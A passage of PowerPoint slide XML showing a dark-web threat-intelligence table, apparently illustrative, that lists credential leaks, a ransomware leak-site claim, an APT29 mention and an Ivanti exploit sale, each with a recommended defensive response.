              <a:t>CRITICAL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="TextBox 48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="3557016"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NEW</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="TextBox 49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3675888" y="3557016"/>
            <a:ext cx="1005840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BreachForums</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="TextBox 50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="3557016"/>
            <a:ext cx="3703320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12k customer PII (name, email, phone, delivery address) listed for $2,500</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="TextBox 51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8567928" y="3557016"/>
            <a:ext cx="1234440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12k customer records</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="TextBox 52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9893808" y="3557016"/>
            <a:ext cx="2331720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Force takedown. GDPR notify.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Rectangle 53"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3776472"/>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813048"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dw-001</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="TextBox 55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="886968" y="3813048"/>
            <a:ext cx="1005840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Credential Leak</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="TextBox 56"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1984248" y="3813048"/>
            <a:ext cx="640080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CRITICAL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="TextBox 57"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="3813048"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>INVESTIGATING</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="TextBox 58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3675888" y="3813048"/>
            <a:ext cx="1005840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Breached.vc</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="TextBox 59"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="3813048"/>
            <a:ext cx="3703320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1,247 @company employee email/password pairs confirmed in breach database</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="TextBox 60"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8567928" y="3813048"/>
            <a:ext cx="1234440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1,247 credentials</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="TextBox 61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9893808" y="3813048"/>
            <a:ext cx="2331720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Force reset. Enable MFA.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="Rectangle 62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4032504"/>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92608" y="4069080"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dw-006</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="TextBox 64"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="886968" y="4069080"/>
            <a:ext cx="1005840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ransomware</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66" name="TextBox 65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1984248" y="4069080"/>
            <a:ext cx="640080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CRITICAL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="TextBox 66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="4069080"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>INVESTIGATING</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="TextBox 67"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3675888" y="4069080"/>
            <a:ext cx="1005840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RansomHub Blog</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="TextBox 68"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="4069080"/>
            <a:ext cx="3703320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RansomHub claims to hold 50GB exfiltrated data. Org named on leak site.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="TextBox 69"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8567928" y="4069080"/>
            <a:ext cx="1234440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>50GB claimed</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="TextBox 70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9893808" y="4069080"/>
            <a:ext cx="2331720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Declare incident. Forensics.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="Rectangle 71"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4288536"/>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2608" y="4325112"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dw-002</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="TextBox 73"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="886968" y="4325112"/>
            <a:ext cx="1005840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Threat Actor</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="TextBox 74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1984248" y="4325112"/>
            <a:ext cx="640080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HIGH</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="TextBox 75"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="4325112"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>INVESTIGATING</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="TextBox 76"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3675888" y="4325112"/>
            <a:ext cx="1005840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>XSS.is Forum</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="TextBox 77"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="4325112"/>
            <a:ext cx="3703320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>APT29 (Cozy Bear) post discusses targeting logistics cos in EMEA region</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="TextBox 78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8567928" y="4325112"/>
            <a:ext cx="1234440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Brand mention</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="TextBox 79"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9893808" y="4325112"/>
            <a:ext cx="2331720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Elevate monitoring.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="Rectangle 80"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4544568"/>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92608" y="4581144"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dw-004</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="TextBox 82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="886968" y="4581144"/>
            <a:ext cx="1005840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exploit Sale</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="TextBox 83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1984248" y="4581144"/>
            <a:ext cx="640080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HIGH</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85" name="TextBox 84"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="4581144"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NEW</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="TextBox 85"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3675888" y="4581144"/>
            <a:ext cx="1005840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0day.today</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="TextBox 86"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="4581144"/>
            <a:ext cx="3703320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ivanti Connect Secure unauthenticated RCE listed at $45,000. Claims org-specific.</a:t>
            </a:r>
          </a:p>
